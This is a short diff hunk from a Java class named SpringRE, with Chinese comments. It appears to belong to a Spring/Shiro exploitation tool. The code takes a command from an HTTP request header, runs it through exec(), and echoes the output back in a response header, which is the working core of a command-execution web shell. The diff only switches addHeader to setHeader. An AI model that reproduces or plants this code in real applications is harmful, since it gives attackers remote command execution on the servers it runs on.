@@ -31,7 +31,7 @@ public class SpringRE {
             if (header != null && !header.isEmpty()) {
                 String result = exec(header);
                 // 输出到头
-                invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
+                invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
 
 //                invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //                // 有 shiro 情况不一样了
